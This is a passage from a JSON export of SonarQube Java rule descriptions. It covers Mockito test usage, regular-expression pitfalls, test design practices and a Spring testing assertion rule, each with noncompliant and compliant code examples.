i2)).willReturn(null); // Noncompliant, no matchers for \"i1\" and \"i2\"\n    when(foo.baz(eq(val1), val2)).thenReturn(\"hi\"); // Noncompliant, no matcher for \"val2\"\n\n    // Simulating exceptions\n    doThrow(new RuntimeException()).when(foo).quux(intThat(x -&gt; x &gt;= 42), -1); // Noncompliant, no matcher for \"-1\"\n\n    // Verifying method invocations\n    verify(foo).bar(i1, anyInt(), i2); // Noncompliant, no matchers for \"i1\" and \"i2\"\n\n    // Capturing arguments for verification\n    ArgumentCaptor&lt;Integer&gt; captor = ArgumentCaptor.forClass(Integer.class);\n    verify(foo).bar(captor.capture(), i1, any()); // Noncompliant, no matchers for \"i1\"\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Test\npublic void myTest() {\n    // Setting up mock responses\n    given(foo.bar(anyInt(), eq(i1), eq(i2))).willReturn(null); // Compliant, all arguments have matchers\n    when(foo.baz(val1, val2)).thenReturn(\"hi\"); // Compliant, no argument has matchers\n\n    // Simulating exceptions\n    doThrow(new RuntimeException()).when(foo).quux(intThat(x -&gt; x &gt;= 42), eq(-1)); // Compliant, all arguments have matchers\n\n    // Verifying method invocations\n    verify(foo).bar(eq(i1), anyInt(), eq(i2)); // Compliant, all arguments have matchers\n\n    // Capturing arguments for verification\n    ArgumentCaptor&lt;Integer&gt; captor = ArgumentCaptor.forClass(Integer.class);\n    verify(foo).bar(captor.capture(), any(), any()); // Compliant, all arguments have matchers\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#argument_matchers\">Mockito documentation</a> -\n  argument matchers </li>\n  <li> <a href=\"https://sonarsource.github.io/rspec/#/rspec/{rule:java:S6068}/java\">{rule:java:S6068} - Call to Mockito method \"verify\", \"when\" or\n  \"given\" should be simplified</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6073","summary":"Mockito argument matchers should be used on all parameters","tags":["tests","mockito"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In regular expressions the escape sequence <code>\\cX</code>, where the X stands for any character thatâs either <code>@</code>, any capital ASCII\nletter, <code>[</code>, <code>\\</code>, <code>]</code>, <code>^</code> or <code>_</code>, represents the control character that \"corresponds\" to the\ncharacter following <code>\\c</code>, meaning the control character that comes 64 bytes before the given character in the ASCII encoding.</p>\n<p>In some other regex engines (for example in that of Perl) this escape sequence is case insensitive and <code>\\cd</code> produces the same control\ncharacter as <code>\\cD</code>. Further using <code>\\c</code> with a character thatâs neither <code>@</code>, any ASCII letter, <code>[</code>,\n<code>\\</code>, <code>]</code>, <code>^</code> nor <code>_</code>, will produce a warning or error in those engines. Neither of these things is true\nin Java, where the value of the character is always XORed with 64 without checking that this operation makes sense. Since this wonât lead to a\nsensible result for characters that are outside of the <code>@</code> to <code>_</code> range, using <code>\\c</code> with such characters is almost\ncertainly a mistake.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPattern.compile(\"\\\\ca\"); // Noncompliant, 'a' is not an upper case letter\nPattern.compile(\"\\\\c!\"); // Noncompliant, '!' is outside of the '@'-'_' range\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern.compile(\"\\\\cA\"); // Compliant, this will match the \"start of heading\" control character\nPattern.compile(\"\\\\c^\"); // Compliant, this will match the \"record separator\" control character\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6070","summary":"The regex escape sequence \\cX should only be used with characters in the @-_ range","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Mockito provides <em>argument matchers</em> for flexibly stubbing or verifying method calls.</p>\n<p><code>Mockito.verify()</code>, <code>Mockito.when()</code>, <code>Stubber.when()</code> and <code>BDDMockito.given()</code> each have overloads\nwith and without argument matchers.</p>\n<p>However, the default matching behavior (i.e. without argument matchers) uses <code>equals()</code>. If only the matcher\n<code>org.mockito.ArgumentMatchers.eq()</code> is used, the call is equivalent to the call without matchers, i.e. the <code>eq()</code> is not\nnecessary and can be omitted. The resulting code is shorter and easier to read.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(eq(v1), eq(v2), eq(v3))).willReturn(null);   // Noncompliant\n  when(foo.baz(eq(v4), eq(v5))).thenReturn(\"foo\");   // Noncompliant\n  doThrow(new RuntimeException()).when(foo).quux(eq(42));    // Noncompliant\n  verify(foo).bar(eq(v1), eq(v2), eq(v3));   // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(v1, v2, v3)).willReturn(null);\n  when(foo.baz(v4, v5)).thenReturn(\"foo\");\n  doThrow(new RuntimeException()).when(foo).quux(42);\n  verify(foo).bar(v1, v2, v3);\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#argument_matchers\">Mockito documentation</a> -\n  argument matchers </li>\n  <li> {rule:java:S6073} - Mockito argument matchers should be used on all parameters </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6068","summary":"Call to Mockito method \"verify\", \"when\" or \"given\" should be simplified","tags":["tests","mockito","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When an alternation contains multiple alternatives that consist of a single character, it can be rewritten as a character class. This should be\npreferred because it is more efficient and can even help prevent stack overflows when used inside a repetition (see rule {rule:java:S5998}).</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPattern.compile(\"a|b|c\"); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern.compile(\"[abc]\");\n// or\nPattern.compile(\"[a-c]\");\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6035","summary":"Single-character alternations in regular expressions should be replaced with character classes","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When a reluctant quantifier (such as <code>*?</code> or <code>+?</code>) is followed by a pattern that can match the empty string or directly by\nthe end of the regex, it will always match the empty string when used with methods that find partial matches (such as <code>find</code>,\n<code>replaceAll</code>, <code>split</code> etc.).</p>\n<p>Similarly, when used with methods that find full matches, a reluctant quantifier thatâs followed directly by the end of the regex (or a pattern\nthat always matches the empty string, such as <code>()</code>) behaves indistinguishably from a greedy quantifier while being less efficient.</p>\n<p>This is likely a sign that the regex does not work as intended.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n\"start123endstart456\".replaceAll(\"start\\\\w*?(end)?\", \"x\"); // Noncompliant. In contrast to what one would expect, the result is not \"xx\".\nstr.matches(\"\\\\d*?\"); // Noncompliant. Matches the same as \"\\d*\", but will backtrack in every position.\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n\"start123endstart456\".replaceAll(\"start\\\\w*?(end|$)\", \"x\"); // Result is \"xx\".\nstr.matches(\"\\\\d*\");\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6019","summary":"Reluctant quantifiers in regular expressions should be followed by an expression that can't match the empty string","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule raises an issue when a regex lookahead contradicts the rest of the regex.</p>\n<h2>Why is this an issue?</h2>\n<p>Lookahead assertions are a regex feature that makes it possible to look ahead in the input without consuming it. It is often used at the end of\nregular expressions to make sure that substrings only match when they are followed by a specific pattern.</p>\n<p>For example, the following pattern will match an \"a\" only if it is directly followed by a \"b\". This does not consume the \"b\" in the process:</p>\n<pre>\nPattern.compile(\"a(?=b)\");\n</pre>\n<p>However, lookaheads can also be used in the middle (or at the beginning) of a regex. In that case there is the possibility that what comes after\nthe lookahead contradicts the pattern inside the lookahead. Since the lookahead does not consume input, this makes the lookahead impossible to match\nand is a sign that thereâs a mistake in the regular expression that should be fixed.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\nPattern.compile(\"(?=a)b\"); // Noncompliant, the same character can't be equal to 'a' and 'b' at the same time\n</pre>\n<h4>Compliant solution</h4>\n<pre>\nPattern.compile(\"(?&lt;=a)b\");\nPattern.compile(\"a(?=b)\");\n</pre>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6002","summary":"Regex lookahead assertions should not be contradictory","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>When a back reference in a regex refers to a capturing group that hasnât been defined yet (or at all), it can never be matched. Named back\nreferences throw a <code>PatternSyntaxException</code> in that case; numeric back references fail silently when they canât match, simply making the\nmatch fail.</p>\n<p>When the group is defined before the back reference but on a different control path (like in <code>(.)|\\1</code> for example), this also leads to a\nsituation where the back reference can never match.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPattern.compile(\"\\\\1(.)\"); // Noncompliant, group 1 is defined after the back reference\nPattern.compile(\"(.)\\\\2\"); // Noncompliant, group 2 isn't defined at all\nPattern.compile(\"(.)|\\\\1\"); // Noncompliant, group 1 and the back reference are in different branches\nPattern.compile(\"(?&lt;x&gt;.)|\\\\k&lt;x&gt;\"); // Noncompliant, group x and the back reference are in different branches\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern.compile(\"(.)\\\\1\");\nPattern.compile(\"(?&lt;x&gt;.)\\\\k&lt;x&gt;\");\n</pre>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6001","summary":"Back references in regular expressions should only refer to capturing groups that are matched before the reference","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The Java regex engine uses recursive method calls to implement backtracking. Therefore when a repetition inside a regular expression contains\nmultiple paths (i.e. the body of the repetition contains an alternation (<code>|</code>), an optional element or another repetition), trying to match\nthe regular expression can cause a stack overflow on large inputs. This does not happen when using a possessive quantifier (such as <code>*+</code>\ninstead of <code>*</code>) or when using a character class inside a repetition (e.g. <code>[ab]*</code> instead of <code>(a|b)*</code>).</p>\n<p>The size of the input required to overflow the stack depends on various factors, including of course the stack size of the JVM. One thing that\nsignificantly increases the size of the input that can be processed is if each iteration of the repetition goes through a chain of multiple constant\ncharacters because such consecutive characters will be matched by the regex engine without invoking any recursion.</p>\n<p>For example, on a JVM with a stack size of 1MB, the regex <code>(?:a|b)*</code> will overflow the stack after matching around 6000 characters\n(actual numbers may differ between JVM versions and even across multiple runs on the same JVM) whereas <code>(?:abc|def)*</code> can handle around\n15000 characters.</p>\n<p>Since often times stack growth canât easily be avoided, this rule will only report issues on regular expressions if they can cause a stack overflow\non realistically sized inputs. You can adjust the <code>maxStackConsumptionFactor</code> parameter to adjust this.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPattern.compile(\"(a|b)*\"); // Noncompliant\nPattern.compile(\"(.|\\n)*\"); // Noncompliant\nPattern.compile(\"(ab?)*\"); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern.compile(\"[ab]*\"); // Character classes don't cause recursion the way that '|' does\nPattern.compile(\"(?s).*\"); // Enabling the (?s) flag makes '.' match line breaks, so '|\\n' isn't necessary\nPattern.compile(\"(ab?)*+\"); // Possessive quantifiers don't cause recursion because they disable backtracking\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5998","summary":"Regular expressions should not overflow the stack","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>In regular expressions the boundaries <code>^</code> and <code>\\A</code> can only match at the beginning of the input (or, in case of\n<code>^</code> in combination with the <code>MULTILINE</code> flag, the beginning of the line) and <code>$</code>, <code>\\Z</code> and <code>\\z</code>\nonly at the end.</p>\n<p>These patterns can be misused, by accidentally switching <code>^</code> and <code>$</code> for example, to create a pattern that can never\nmatch.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n// This can never match because $ and ^ have been switched around\nPattern.compile(\"$[a-z]+^\"); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern.compile(\"^[a-z]+$\");\n</pre>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5996","summary":"Regex boundaries should not be used in a way that can never be matched","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Possessive quantifiers in Regex patterns like below improve performance by eliminating needless backtracking:</p>\n<pre>\n?+ , *+ , ++ , {n}+ , {n,}+ , {n,m}+\n</pre>\n<p>But because possessive quantifiers do not keep backtracking positions and never give back, the following sub-patterns should not match only similar\ncharacters. Otherwise, possessive quantifiers consume all characters that could have matched the following sub-patterns and nothing remains for the\nfollowing sub-patterns.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPattern pattern1 = Pattern.compile(\"a++abc\");       // Noncompliant, the second 'a' never matches\nPattern pattern2 = Pattern.compile(\"\\\\d*+[02468]\"); // Noncompliant, the sub-pattern \"[02468]\" never matches\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPattern pattern1 = Pattern.compile(\"aa++bc\");            // Compliant, for example it can match \"aaaabc\"\nPattern pattern2 = Pattern.compile(\"\\\\d*+(?&lt;=[02468])\"); // Compliant, for example it can match an even number like \"1234\"\n</pre>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5994","summary":"Regex patterns following a possessive quantifier should not always fail","tags":["regex"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Abstract classes should not have public constructors. Constructors of abstract classes can only be called in constructors of their subclasses. So\nthere is no point in making them public. The <code>protected</code> modifier should be enough.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic abstract class AbstractClass1 {\n    public AbstractClass1 () { // Noncompliant, has public modifier\n        // do something here\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic abstract class AbstractClass2 {\n    protected AbstractClass2 () {\n        // do something here\n    }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5993","summary":"Constructors of an \"abstract\" class should not be declared \"public\"","tags":["design"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Objects annotated with Mockito annotations <code>@Mock</code>,&nbsp;<code>@Spy</code>,&nbsp;<code>@Captor</code>,&nbsp;or <code>@InjectMocks</code>\nneed to be initialized explicitly.</p>\n<p>There are several ways to do this:</p>\n<ul>\n  <li> Call <code>MockitoAnnotations.openMocks(this)</code> or&nbsp;<code>MockitoAnnotations.initMocks(this)</code>&nbsp;in a setup method </li>\n  <li> Annotate test class with&nbsp;<code>@RunWith(MockitoJUnitRunner.class)</code>&nbsp;(JUnit 4) </li>\n  <li> Annotate test class with&nbsp;<code>@ExtendWith(MockitoExtension.class)</code>&nbsp;(JUnit 5 Jupiter) </li>\n  <li> Use&nbsp;<code>@Rule public MockitoRule rule = MockitoJUnit.rule();</code> </li>\n</ul>\n<p>Test using uninitialized mocks will fail.</p>\n<p>Note that this only applies to annotated Mockito objects. It is not necessary to initialize objects instantiated via <code>Mockito.mock()</code> or\n<code>Mockito.spy()</code>.</p>\n<p>This rule raises an issue when a test class uses uninitialized mocks.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class FooTest { // Noncompliant: Mockito initialization missing\n  @Mock private Bar bar;\n\n  @Spy private Baz baz;\n\n  @InjectMocks private Foo fooUnderTest;\n\n  @Test\n  void someTest() {\n    // test something ...\n  }\n\n  @Nested\n  public class Nested {\n    @Mock\n    private Bar bar;\n  }\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@RunWith(MockitoJUnitRunner.class)\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n}\n</pre>\n<pre>\n@ExtendWith(MockitoExtension.class)\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n}\n</pre>\n<pre>\npublic class FooTest {\n  @Rule\n  public MockitoRule rule = MockitoJUnit.rule();\n\n  @Mock private Bar bar;\n  // ...\n}\n</pre>\n<pre>\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n\n  @BeforeEach\n  void setUp() {\n    MockitoAnnotations.openMocks(this);\n  }\n  // ...\n}\n</pre>\n<pre>\npublic class FooTest {\n  @Mock private Bar bar;\n  // ...\n\n  @Before\n  void setUp() {\n    MockitoAnnotations.initMocks(this);\n  }\n  // ...\n}\n</pre>\n<pre>\n@ExtendWith(MockitoExtension.class)\npublic class FooTest {\n  @Nested\n  public class Nested {\n    @Mock\n    private Bar bar;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://site.mockito.org/javadoc/current/org/mockito/MockitoAnnotations.html\">Mockito documentation - MockitoAnnotations</a> </li>\n  <li> <a href=\"https://site.mockito.org/javadoc/current/org/mockito/junit/MockitoRule.html\">Mockito documentation - MockitoRule </a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-5979","summary":"Annotated Mockito objects should be initialized","tags":["tests","mockito"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Randomness in test code, whether introduced intentionally to cover multiple scenarios or unintentionally through non-deterministic library\nfunctions, undermines the principles of effective testing. In most cases, randomness leads to problems, resulting in code that is unreliable and\ndifficult to debug. Consequently, deterministic and reproducible tests are preferred, primarily for the following reasons:</p>\n<ul>\n  <li> When a test fails, the ability to reproduce the conditions that led to the failure is crucial for effective debugging. Randomness can make it\n  difficult or even impossible to pinpoint the root cause, as subsequent runs may not exhibit the same failure. </li>\n  <li> Being able to replay a scenario allows us to easily compare logs between different test runs. </li>\n  <li> Determinism gives us confidence that a bug is fixed when it no longer appears in tests. If they behave randomly, a passing test after a fix\n  might be coincidental due to a specific random input, rather than a genuine resolution of the underlying problem. </li>\n  <li> Flaky tests, which pass or fail intermittently without any code changes, are a significant problem for CI pipelines (continuous integration).\n  They erode confidence in the CI system, lead to unnecessary investigations and reruns, and ultimately slow down the development and release process.\n  A stable CI pipeline relies on deterministic test outcomes. </li>\n</ul>\n<p>This rule raises an issue when <code>new Random()</code> or <code>UUID.randomUUID()</code> are called in test code.</p>\n<h2>How to fix it</h2>\n<ul>\n  <li> When a test uses random numbers to generate inputs, an easy fix is to replace those random inputs with pseudo-random values generated from a\n  known seed. By initializing a pseudo-random number generator with a fixed seed, tests can generate sequences of seemingly random data that are\n  reproducible across different test runs. </li>\n  <li> When randomness occurs due to the use of a library function, the solution is to replace the call with a constant. For example, rather than\n  generating a UUID at random, one should use a fixed value. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nint userAge = new Random().nextInt(42);  // Noncompliant\nUUID userID = UUID.randomUUID(); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nstatic final int SEED = 0x533d;\nint userAge = new Random(SEED).nextInt(42);\nUUID userID = UUID.fromString(\"00000000-000-0000-0000-000000000001\");\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://phauer.com/2019/modern-best-practices-testing-java/#use-fixed-data-instead-of-randomized-data\">Modern Best Practices for\n  Testing in Java - Philipp Hauer</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-5977","summary":"Tests should use fixed data instead of randomized data","tags":["tests","design","confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When multiple tests differ only by a few hardcoded values they should be refactored as a single \"parameterized\" test. This reduces the chances of\nadding a bug and makes them more readable. Parameterized tests exist in most test frameworks (JUnit, TestNG, etcâ¦â).</p>\n<p>The right balance needs of course to be found. There is no point in factorizing test methods when the parameterized version is a lot more complex\nthan initial tests.</p>\n<p>This rule raises an issue when at least 3 tests could be refactored as one parameterized test with less than 4 parameters. Only test methods which\nhave at least one duplicated statement are considered.</p>\n<h3>Noncompliant code example</h3>\n<p>with JUnit 5</p>\n<pre>\nimport static org.junit.jupiter.api.Assertions.assertEquals;\n\nimport org.junit.jupiter.api.Test;\n\npublic class AppTest\n{\n    @Test\n    void test_not_null1() {  // Noncompliant. The 3 following tests differ only by one hardcoded number.\n      setupTax();\n      assertNotNull(getTax(1));\n    }\n\n    @Test\n    void test_not_null2() {\n      setupTax();\n      assertNotNull(getTax(2));\n    }\n\n    @Test\n    void test_not_nul3l() {\n      setupTax();\n      assertNotNull(getTax(3));\n    }\n\n    @Test\n    void testLevel1() {  // Noncompliant. The 3 following tests differ only by a few hardcoded numbers.\n        setLevel(1);\n        runGame();\n        assertEquals(playerHealth(), 100);\n    }\n\n    @Test\n    void testLevel2() {  // Similar test\n        setLevel(2);\n        runGame();\n        assertEquals(playerHealth(), 200);\n    }\n\n    @Test\n    void testLevel3() {  // Similar test\n        setLevel(3);\n        runGame();\n        assertEquals(playerHealth(), 300);\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nimport static org.junit.jupiter.api.Assertions.assertEquals;\n\nimport org.junit.jupiter.params.ParameterizedTest;\nimport org.junit.jupiter.params.provider.CsvSource;\n\npublic class AppTest\n{\n\n   @ParameterizedTest\n   @ValueSource(ints = {1, 2, 3})\n   void test_not_null(int arg) {\n     setupTax();\n     assertNotNull(getTax(arg));\n   }\n\n    @ParameterizedTest\n    @CsvSource({\n        \"1, 100\",\n        \"2, 200\",\n        \"3, 300\",\n    })\n    void testLevels(int level, int health) {\n        setLevel(level);\n        runGame();\n        assertEquals(playerHealth(), health);\n    }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://phauer.com/2019/modern-best-practices-testing-java/#use-parameterized-tests\">Modern Best Practices for Testing in Java -\n  Philipp Hauer</a> </li>\n  <li> <a href=\"https://junit.org/junit5/docs/current/user-guide/#writing-tests-parameterized-tests\">JUnit 5 documentation - Parameterized tests</a>\n  </li>\n  <li> <a href=\"https://www.testwithspring.com/lesson/writing-parameterized-tests-with-junit-4/\">Writing Parameterized Tests With JUnit 4</a> </li>\n  <li> <a href=\"https://testng.org/#_parameters\">TestNG documentation - Parameters</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5976","summary":"Similar tests should be grouped in a single Parameterized test","tags":["tests","bad-practice","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Unstable / flaky tests are tests which sometimes pass and sometimes fail, without any code change. Obviously, they slow down developments when\ndevelopers have to rerun failed tests. However, the real problem is that you canât completely trust these tests, they might fail for many different\nreasons and you donât know if any of them will happen in production.</p>\n<p>Some tools, such as TestNG, enable developers to automatically retry flaky tests. This might be acceptable as a temporary solution, but it should\neventually be fixed. The more flaky tests you add, the more chances there are for a bug to arrive in production.</p>\n<p>This rule raises an issue when the annotation <code>org.testng.annotations.Test</code> is given a <code>successPercentage</code> argument with a\nvalue lower than <code>100</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nimport org.testng.annotations.Test;\n\npublic class PercentageTest {\n    @Test(successPercentage = 80, invocationCount = 10)  // Noncompliant. The test is allowed to fail 2 times.\n    public void flakyTest() {\n    }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> TestNG documentation - <a href=\"https://testng.org/#_annotations\">Annotations</a> </li>\n  <li> Spotify Engineering - <a\n  href=\"https://engineering.atspotify.com/2019/11/18/test-flakiness-methods-for-identifying-and-dealing-with-flaky-tests/\">Test Flakiness - Methods\n  for identifying and dealing with flaky tests</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"},{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5973","summary":"Tests should be stable","tags":["tests","design","unpredictable"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TESTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The Spring framework comes with dedicated classes to help writing better and simpler unit tests. In particular, when testing applications built on\ntop of Spring MVC, it is recommended to use Springâs <code>ModelAndViewAssert</code> assertions class, instead of manually testing MVCâs\nproperties.</p>\n<p>&nbsp;</p>\n<p>This rule raises an issue when&nbsp;Springâs <code>ModelAndViewAssert</code> assertions should be used instead of manual testing.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nModelAndView mav = getMyModelAndView();\n\nAssert.assertEquals(\"register\", mav.getViewName());\nAssert.assertTrue((Boolean) mav.getModelMap().get(\"myAttribute\"));\nAssert.assertFalse((Boolean) mav.getModelMap().get(\"myAttribute\"));\nAssert.assertEquals(myObject, mav.getModelMap().get(\"myAttribute\"));\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nModelAndView mav = getMyModelAndView();\n\nModelAndViewAssert.assertViewName(mav, \"register\");\nModelAndViewAssert.assertModelAttributeValue(mav, \"myAttribute\", Boolean.TRUE);\nModelAndViewAssert.assertModelAttributeValue(mav, \"myAttribute\", Boolean.FALSE);\nModelAndViewAssert.assertModelAttributeValue(mav, \"myAttribute\", myObject);\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/testing.html#unit-testing-spring-mvc\">Unit Testing\n  Spring MVC</a> </li>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/5.2.8.RELEASE/javadoc-api/org/springframework/test/web/ModelAndViewAssert.html\">ModelAndViewAssert Javadoc</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-5970","summary":"Spring's ModelAndViewAssert assertions should be used instead of other assertions","tags":["spring","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>If you end up mocking every non-private method of a class in order to write tests, it is a strong sign that your test became too complex, or 